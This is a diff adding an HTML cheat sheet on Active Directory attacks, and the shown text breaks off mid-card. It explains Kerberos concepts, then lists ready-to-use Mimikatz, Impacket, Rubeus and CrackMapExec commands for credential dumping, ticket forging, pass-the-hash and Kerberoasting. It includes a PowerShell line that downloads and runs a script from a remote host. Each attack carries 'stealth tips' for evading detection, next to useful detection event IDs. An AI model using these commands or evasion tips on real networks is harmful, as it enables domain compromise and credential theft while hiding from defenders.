@@ -1,0 +1,1266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Active Directory Attacks Explained</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #0f172a;
+            color: #e2e8f0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 40px 0 30px;
+            border-bottom: 1px solid #334155;
+            margin-bottom: 40px;
+        }
+        
+        h1 {
+            font-size: 2.8rem;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            color: #94a3b8;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+        }
+        
+        section {
+            margin-bottom: 50px;
+        }
+        
+        h2 {
+            font-size: 2rem;
+            color: #60a5fa;
+            margin-bottom: 25px;
+            border-left: 4px solid #3b82f6;
+            padding-left: 15px;
+        }
+        
+        h3 {
+            font-size: 1.5rem;
+            color: #93c5fd;
+            margin: 25px 0 15px;
+        }
+        
+        .concepts-grid, .commands-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .concept-card, .command-card {
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 10px;
+            padding: 20px;
+            transition: transform 0.3s;
+            border-top: 3px solid #3b82f6;
+        }
+        
+        .concept-card:hover, .command-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .concept-title, .command-title {
+            font-size: 1.3rem;
+            color: #60a5fa;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .concept-icon, .command-icon {
+            margin-right: 10px;
+            font-size: 1.5rem;
+        }
+        
+        .acronym {
+            color: #fbbf24;
+            font-weight: bold;
+        }
+        
+        .intro {
+            text-align: center;
+            max-width: 900px;
+            margin: 0 auto 50px;
+            padding: 20px;
+            background: rgba(30, 41, 59, 0.5);
+            border-radius: 10px;
+            border-left: 4px solid #3b82f6;
+        }
+        
+        .attack-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+        
+        .attack-card {
+            background: rgba(30, 41, 59, 0.7);
+            border-radius: 10px;
+            padding: 25px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            border-top: 4px solid;
+            height: 100%;
+        }
+        
+        .attack-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .attack-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .attack-icon {
+            margin-right: 10px;
+            font-size: 1.8rem;
+        }
+        
+        .attack-section {
+            margin-bottom: 20px;
+        }
+        
+        .section-title {
+            font-size: 1.1rem;
+            color: #60a5fa;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .section-title i {
+            margin-right: 8px;
+        }
+        
+        .impact-critical { color: #ef4444; }
+        .impact-high { color: #f97316; }
+        .impact-medium { color: #eab308; }
+        .impact-low { color: #22c55e; }
+        
+        .tool-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 5px;
+        }
+        
+        .tool-tag {
+            background: rgba(59, 130, 246, 0.2);
+            padding: 4px 10px;
+            border-radius: 15px;
+            font-size: 0.85rem;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+        }
+        
+        .command-box {
+            background: rgba(15, 23, 42, 0.9);
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: #86efac;
+            overflow-x: auto;
+        }
+        
+        .command-desc {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+            margin-top: 5px;
+            margin-bottom: 15px;
+        }
+        
+        .example-box {
+            background: rgba(30, 41, 59, 0.9);
+            border-left: 3px solid #3b82f6;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 0 5px 5px 0;
+            font-size: 0.9rem;
+        }
+        
+        .opsec-box {
+            background: rgba(245, 158, 11, 0.1);
+            border-left: 3px solid #f59e0b;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 0 5px 5px 0;
+            font-size: 0.9rem;
+        }
+        
+        .example-title, .opsec-title {
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #60a5fa;
+        }
+        
+        .opsec-title {
+            color: #f59e0b;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 40px;
+            border-top: 1px solid #334155;
+            color: #94a3b8;
+            font-size: 0.9rem;
+        }
+        
+        .warning {
+            color: #f59e0b;
+            font-weight: bold;
+        }
+        
+        .note-box {
+            background: rgba(245, 158, 11, 0.1);
+            border-left: 4px solid #f59e0b;
+            padding: 15px;
+            margin: 30px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .info-box {
+            background: rgba(59, 130, 246, 0.1);
+            border-left: 4px solid #3b82f6;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+        
+        .tab-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .tab-button {
+            background: rgba(30, 41, 59, 0.7);
+            border: 1px solid #475569;
+            color: #cbd5e1;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .tab-button:hover {
+            background: rgba(59, 130, 246, 0.2);
+            border-color: #3b82f6;
+        }
+        
+        .tab-button.active {
+            background: rgba(59, 130, 246, 0.3);
+            border-color: #3b82f6;
+            color: #60a5fa;
+            font-weight: bold;
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        @media (max-width: 768px) {
+            .attack-grid, .concepts-grid, .commands-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            h2 {
+                font-size: 1.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Active Directory Attacks</h1>
+            <p class="subtitle">Understanding Common AD Attack Vectors & Mitigations</p>
+        </header>
+        
+        <div class="intro">
+            <p>Active Directory (AD) is a critical component of most Windows network environments, but it's also a primary target for attackers. Understanding these attack techniques is essential for both penetration testers and defenders.</p>
+            <p class="warning" style="margin-top: 15px;">Note: This information is for educational and defensive purposes only.</p>
+        </div>
+        
+        <!-- Kerberos/AD Concepts Section -->
+        <section id="concepts">
+            <h2><i class="fas fa-book"></i> Kerberos & Active Directory Concepts</h2>
+            <p>Understanding these fundamental concepts is essential to grasp how AD attacks work:</p>
+            
+            <div class="concepts-grid">
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-ticket-alt concept-icon"></i>
+                        <span class="acronym">TGT</span> - Ticket Granting Ticket
+                    </div>
+                    <p>A TGT is issued by the Authentication Service (AS) during the initial authentication. It allows the user to request service tickets (TGS) without re-entering credentials for a certain period (usually 10 hours).</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-ticket concept-icon"></i>
+                        <span class="acronym">TGS</span> - Ticket Granting Service
+                    </div>
+                    <p>A service ticket issued by the Ticket Granting Service to allow a user to access a specific network service. The TGS is encrypted with the service account's password hash.</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-user-shield concept-icon"></i>
+                        <span class="acronym">KRBTGT</span> Account
+                    </div>
+                    <p>A special domain account used to encrypt and sign all TGTs in the domain. Compromising the KRBTGT account hash allows attackers to create Golden Tickets.</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-id-card concept-icon"></i>
+                        <span class="acronym">SPN</span> - Service Principal Name
+                    </div>
+                    <p>A unique identifier for a service instance, used to associate a service with a domain account. Format: service_class/host:port/service_name. Required for Kerberoasting attacks.</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-fingerprint concept-icon"></i>
+                        <span class="acronym">SID</span> - Security Identifier
+                    </div>
+                    <p>A unique value that identifies a user, group, or computer account in Windows. Domain SID format: S-1-5-21-3623811015-3361044348-30300820-</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-hashtag concept-icon"></i>
+                        NT Hash (NTLM Hash)
+                    </div>
+                    <p>The result of hashing a password with the MD4 algorithm, used for NTLM authentication. Stored in the SAM database or NTDS.dit. Example: aad3b435b51404eeaad3b435b51404ee (empty password hash).</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-user-lock concept-icon"></i>
+                        Kerberos Authentication Flow
+                    </div>
+                    <p>1. AS-REQ: User requests TGT<br>
+                       2. AS-REP: DC returns encrypted TGT<br>
+                       3. TGS-REQ: User requests service ticket<br>
+                       4. TGS-REP: DC returns service ticket<br>
+                       5. AP-REQ: User presents ticket to service</p>
+                </div>
+                
+                <div class="concept-card">
+                    <div class="concept-title">
+                        <i class="fas fa-database concept-icon"></i>
+                        NTDS.dit
+                    </div>
+                    <p>The AD database file containing all domain objects, including password hashes. Located on domain controllers at %SystemRoot%\NTDS\NTDS.dit. Often targeted in credential dumping attacks.</p>
+                </div>
+            </div>
+            
+            <div class="info-box">
+                <i class="fas fa-lightbulb"></i> <strong>Key Insight:</strong> Most AD attacks exploit weaknesses in how Kerberos tickets are issued, validated, or delegated. Understanding the normal flow helps identify attack vectors.
+            </div>
+        </section>
+        
+        <!-- Command Examples Section -->
+        <section id="commands">
+            <h2><i class="fas fa-terminal"></i> Command Examples</h2>
+            <p>Common commands used in AD attacks (for educational/defensive purposes):</p>
+            
+            <div class="tab-buttons">
+                <button class="tab-button active" onclick="switchTab('mimikatz')">Mimikatz</button>
+                <button class="tab-button" onclick="switchTab('impacket')">Impacket</button>
+                <button class="tab-button" onclick="switchTab('rubeus')">Rubeus</button>
+                <button class="tab-button" onclick="switchTab('others')">Other Tools</button>
+            </div>
+            
+            <!-- Mimikatz Tab -->
+            <div id="mimikatz" class="tab-content active">
+                <h3>Mimikatz Commands</h3>
+                
+                <div class="command-box">privilege::debug</div>
+                <div class="command-desc">Enable debug privileges (required for many operations)</div>
+                
+                <div class="command-box">sekurlsa::logonpasswords</div>
+                <div class="command-desc">Dump credentials from LSASS memory</div>
+                
+                <div class="command-box">lsadump::lsa /patch</div>
+                <div class="command-desc">Extract password hashes from LSASS</div>
+                
+                <div class="command-box">kerberos::golden /admin:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:hash /ptt</div>
+                <div class="command-desc">Create Golden Ticket and inject into memory</div>
+                
+                <div class="command-box">kerberos::ptt ticket.kirbi</div>
+                <div class="command-desc">Inject a Kerberos ticket into current session</div>
+                
+                <div class="command-box">sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash /run:powershell.exe</div>
+                <div class="command-desc">Perform Pass-the-Hash attack</div>
+            </div>
+            
+            <!-- Impacket Tab -->
+            <div id="impacket" class="tab-content">
+                <h3>Impacket Toolkit Commands</h3>
+                
+                <div class="command-box">python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt</div>
+                <div class="command-desc">Perform ASREP Roasting attack</div>
+                
+                <div class="command-box">python3 GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user</div>
+                <div class="command-desc">Perform Kerberoasting attack</div>
+                
+                <div class="command-box">python3 secretsdump.py domain.local/administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:hash</div>
+                <div class="command-desc">Dump hashes from DC using Pass-the-Hash</div>
+                
+                <div class="command-box">python3 goldenPac.py domain.local/administrator@10.10.10.10</div>
+                <div class="command-desc">Exploit MS14-068 to create Golden Ticket</div>
+                
+                <div class="command-box">python3 wmiexec.py domain.local/administrator@10.10.10.10 -hashes hash</div>
+                <div class="command-desc">Execute commands via WMI using Pass-the-Hash</div>
+            </div>
+            
+            <!-- Rubeus Tab -->
+            <div id="rubeus" class="tab-content">
+                <h3>Rubeus Commands (C# tool)</h3>
+                
+                <div class="command-box">Rubeus.exe kerberoast /outfile:hashes.txt</div>
+                <div class="command-desc">Kerberoasting - request TGS tickets for SPN accounts</div>
+                
+                <div class="command-box">Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt</div>
+                <div class="command-desc">ASREP Roasting - target accounts without pre-auth</div>
+                
+                <div class="command-box">Rubeus.exe golden /krbtgt:hash /domain:domain.local /sid:SID /user:administrator /ptt</div>
+                <div class="command-desc">Create Golden Ticket</div>
+                
+                <div class="command-box">Rubeus.exe harvest /interval:30</div>
+                <div class="command-desc">Harvest tickets every 30 seconds (for unconstrained delegation)</div>
+                
+                <div class="command-box">Rubeus.exe ptt /ticket:ticket.kirbi</div>
+                <div class="command-desc">Inject a Kerberos ticket (Pass-the-Ticket)</div>
+            </div>
+            
+            <!-- Other Tools Tab -->
+            <div id="others" class="tab-content">
+                <h3>Other Tool Commands</h3>
+                
+                <div class="command-box">hashcat -m 13100 kerberoast_hashes.txt rockyou.txt</div>
+                <div class="command-desc">Crack Kerberoasting hashes (mode 13100 = Kerberos 5 TGS-REP)</div>
+                
+                <div class="command-box">hashcat -m 18200 asrep_hashes.txt rockyou.txt</div>
+                <div class="command-desc">Crack ASREP Roasting hashes (mode 18200 = Kerberos 5 AS-REP)</div>
+                
+                <div class="command-box">crackmapexec smb 10.10.10.0/24 -u user -H hash</div>
+                <div class="command-desc">Perform Pass-the-Hash across network range</div>
+                
+                <div class="command-box">bloodhound-python -d domain.local -u user -p password -ns 10.10.10.10 -c All</div>
+                <div class="command-desc">Collect BloodHound data from domain</div>
+                
+                <div class="command-box">powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')"</div>
+                <div class="command-desc">Load PowerView for AD reconnaissance</div>
+            </div>
+        </section>
+        
+        <!-- Attacks Section -->
+        <section id="attacks">
+            <h2><i class="fas fa-shield-alt"></i> Active Directory Attacks</h2>
+            
+            <div class="note-box">
+                <i class="fas fa-exclamation-triangle"></i> These attacks typically require initial access to the network, often through phishing, exploitation of vulnerabilities, or other means.
+            </div>
+            
+            <div class="attack-grid">
+                <!-- Golden Ticket Attack -->
+                <div class="attack-card" style="border-color: #f59e0b;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-crown attack-icon" style="color: #f59e0b;"></i>
+                        Golden Ticket Attack
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Forged Kerberos Ticket Granting Ticket (TGT) that provides unrestricted access to any resource in the domain. Created using the KRBTGT account's hash.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>Domain admin privileges or KRBTGT account hash, Domain SID, and knowledge of the domain name.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Mimikatz</span>
+                            <span class="tool-tag">Impacket</span>
+                            <span class="tool-tag">Rubeus</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-critical">Critical: Complete domain compromise, persistence, and bypass of authentication.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Mimikatz:</div>
+                            <code>kerberos::golden /admin:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:a9b30e5f... /ptt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus:</div>
+                            <code>Rubeus.exe golden /krbtgt:a9b30e5f... /domain:domain.local /sid:S-1-5-21-... /user:Administrator /ptt</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • DC event 4769 (Kerberos TGT requested) with abnormal encryption type (0x17 for RC4)<br>
+                            • DC event 4672 (Special privileges assigned) when using Golden Ticket<br>
+                            • Tickets with extremely long lifetimes (default: 10 years)
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Use Diamond Ticket instead for better stealth<br>
+                            • Set reasonable ticket lifetime (not 10 years)<br>
+                            • Use from a compromised host rather than attacker machine<br>
+                            • Reset KRBTGT password twice to invalidate all Golden Tickets
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Silver Ticket Attack -->
+                <div class="attack-card" style="border-color: #a1a1aa;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-ticket-alt attack-icon" style="color: #a1a1aa;"></i>
+                        Silver Ticket Attack
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Forged Kerberos service ticket (TGS) for a specific service. Doesn't require communication with DC as it's signed with service account hash.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>Service account hash, target service SPN, domain SID, and target username.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Mimikatz</span>
+                            <span class="tool-tag">Impacket</span>
+                            <span class="tool-tag">Rubeus</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-high">High: Access to specific service, lateral movement, and persistence.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Mimikatz:</div>
+                            <code>kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:HOST /rc4:service_hash /ptt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Creating CIFS ticket:</div>
+                            <code>kerberos::golden /domain:domain.local /sid:SID /user:user /service:cifs /target:server.domain.local /rc4:hash /ptt</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • Service logs will show access but no corresponding TGT request on DC<br>
+                            • Event 4769 on DC missing for the Silver Ticket usage<br>
+                            • PAC validation failures if ticket is poorly forged
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Use legitimate user SIDs that exist in the domain<br>
+                            • Set appropriate ticket timestamps (not future dates)<br>
+                            • Limit use to targeted services only<br>
+                            • Use from already compromised systems
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Diamond Ticket Attack -->
+                <div class="attack-card" style="border-color: #60a5fa;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-gem attack-icon" style="color: #60a5fa;"></i>
+                        Diamond Ticket Attack
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Modified legitimate TGT ticket rather than forged from scratch. More stealthy than Golden Ticket as it uses real encrypted timestamps.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>KRBTGT hash, legitimate TGT ticket, ability to decrypt and re-encrypt ticket.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Rubeus</span>
+                            <span class="tool-tag">Custom tools</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-critical">Critical: Domain persistence with better stealth than Golden Ticket.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus Diamond Attack:</div>
+                            <code>Rubeus.exe diamond /domain:domain.local /user:user /password:Passw0rd! /dc:dc.domain.local /enctype:AES256 /krbkey:KRBTGT_key /ticketuser:Administrator /groups:512 /ptt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">With RC4 encryption:</div>
+                            <code>Rubeus.exe diamond /rc4:krbtgt_hash /domain:domain.local /user:victim /ticketuser:Administrator /ptt</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • Still generates DC event 4769 but with legitimate encryption types<br>
+                            • Unusual PAC contents (privilege escalation)<br>
+                            • Ticket timestamps may not match user's login patterns
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Use AES encryption instead of RC4 when possible<br>
+                            • Modify tickets of recently active users<br>
+                            • Keep group memberships realistic for the target user<br>
+                            • Use during normal business hours
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Pass the Hash -->
+                <div class="attack-card" style="border-color: #34d399;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-key attack-icon" style="color: #34d399;"></i>
+                        Pass the Hash (PtH)
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Using the NT hash of a user's password (instead of the password itself) to authenticate to a remote system.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>User's NT hash, SMB/WinRM access to target, and disabled NTLM restrictions.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Mimikatz</span>
+                            <span class="tool-tag">Impacket</span>
+                            <span class="tool-tag">CrackMapExec</span>
+                            <span class="tool-tag">Metasploit</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-high">High: Lateral movement without needing plaintext passwords.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Mimikatz:</div>
+                            <code>sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:aad3b435b51404eeaad3b435b51404ee:hash /run:cmd.exe</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">CrackMapExec:</div>
+                            <code>crackmapexec smb 10.10.10.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:hash</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Impacket wmiexec:</div>
+                            <code>python3 wmiexec.py -hashes :hash domain.local/administrator@10.10.10.10</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • Windows event 4624 (logon) with logon type 9 (NewCredentials)<br>
+                            • NTLM authentication logs (event 4776) from unusual sources<br>
+                            • Multiple failed logons followed by success with same hash
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Use Overpass-the-Hash instead to use Kerberos<br>
+                            • Perform from already compromised systems<br>
+                            • Use during the compromised user's normal working hours<br>
+                            • Limit number of authentication attempts
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Overpass the Hash -->
+                <div class="attack-card" style="border-color: #8b5cf6;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-exchange-alt attack-icon" style="color: #8b5cf6;"></i>
+                        Overpass the Hash
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Converting an NT hash into a Kerberos TGT, allowing movement from NTLM to Kerberos authentication.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>User's NT hash, domain account, and access to a system where Kerberos can be requested.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Mimikatz</span>
+                            <span class="tool-tag">Rubeus</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-medium">Medium: Obtain Kerberos tickets from hashes, enabling more stealthy movement.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Mimikatz:</div>
+                            <code>sekurlsa::pth /user:user /domain:domain.local /ntlm:hash /run:"powershell.exe"</code>
+                            <div style="margin-top: 5px; font-size: 0.85rem;">Then in the new PowerShell: <code>mimikatz.exe "kerberos::ask /target:hostname.domain.local"</code></div>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus:</div>
+                            <code>Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:hash /ptt</code>
+                        </div>
+                    </div>
+                    
+                    <!-- Added OPSEC Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-user-secret"></i> OPSEC Considerations
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Detection Risks:</div>
+                            • DC event 4768 (TGT requested) with RC4 encryption (type 0x17)<br>
+                            • Logon event 4624 with logon type 9<br>
+                            • TGT requests from non-domain joined systems
+                        </div>
+                        <div class="opsec-box">
+                            <div class="opsec-title">Stealth Tips:</div>
+                            • Request AES tickets instead of RC4 when possible<br>
+                            • Use from domain-joined systems when possible<br>
+                            • Request tickets during normal hours for the user<br>
+                            • Clean up tickets after use
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Kerberoasting -->
+                <div class="attack-card" style="border-color: #f97316;">
+                    <h3 class="attack-title">
+                        <i class="fas fa-fire attack-icon" style="color: #f97316;"></i>
+                        Kerberoasting
+                    </h3>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-info-circle"></i> Description
+                        </div>
+                        <p>Requesting service tickets for accounts with SPNs and then cracking them offline to obtain plaintext passwords.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-clipboard-check"></i> Requirements
+                        </div>
+                        <p>Domain account (any), service accounts with SPNs, and weak service account passwords.</p>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-tools"></i> Tools
+                        </div>
+                        <div class="tool-list">
+                            <span class="tool-tag">Rubeus</span>
+                            <span class="tool-tag">Impacket</span>
+                            <span class="tool-tag">Hashcat</span>
+                            <span class="tool-tag">John the Ripper</span>
+                        </div>
+                    </div>
+                    
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-exclamation-triangle"></i> Impact
+                        </div>
+                        <p class="impact-high">High: Obtain service account credentials, potentially leading to privilege escalation.</p>
+                    </div>
+                    
+                    <!-- Added Commands Section -->
+                    <div class="attack-section">
+                        <div class="section-title">
+                            <i class="fas fa-terminal"></i> Example Commands
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Rubeus:</div>
+                            <code>Rubeus.exe kerberoast /outfile:hashes.txt</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">Impacket:</div>
+                            <code>python3 GetUserSPNs.py -request -dc-ip 10.10.10.10 domain.local/user</code>
+                        </div>
+                        <div class="example-box">
+                            <div class="example-title">PowerShell:</div>
+                            <code>Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sqlserver.domain.local:1433"</code>
+                        </div>
+                        <div class="example-box">
